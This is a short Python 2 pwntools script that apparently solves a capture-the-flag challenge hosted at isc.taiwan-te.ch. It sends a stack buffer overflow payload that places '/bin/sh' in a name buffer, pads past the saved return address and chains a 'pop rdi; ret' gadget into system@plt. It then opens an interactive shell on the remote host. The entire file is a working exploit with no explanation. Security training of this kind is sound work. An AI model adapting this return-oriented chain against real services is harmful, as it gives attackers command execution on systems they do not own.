#!/usr/bin/env python2
from pwn import *
import pwnlib.shellcraft

#init
c = remote('isc.taiwan-te.ch', 10005)

context.os='linux'
context.arch='amd64'

ans = '/bin/sh' + '\0' * (16 - 7)   # name
ans += "\0" * (16 + 8)              # fill buffer
ans += p64(0x400733)                # pop rdi ; ret
ans += p64(0x601070)                # <name>
ans += p64(0x400682)                # return to call system@plt

c.sendline(ans)

c.interactive()
c.close()
